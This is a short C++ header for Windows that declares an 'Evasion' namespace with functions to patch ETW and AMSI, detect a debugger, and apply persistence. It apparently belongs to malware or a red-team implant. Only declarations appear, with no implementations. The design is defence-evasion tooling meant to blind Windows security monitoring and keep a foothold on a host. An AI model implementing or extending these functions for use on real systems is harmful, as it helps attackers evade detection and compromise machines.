#pragma once
#include <windows.h>

namespace Evasion {
    void PatchETW();
    void PatchAMSI();
    bool IsDebuggerPresentCheck();
    void ApplyPersistence();
}
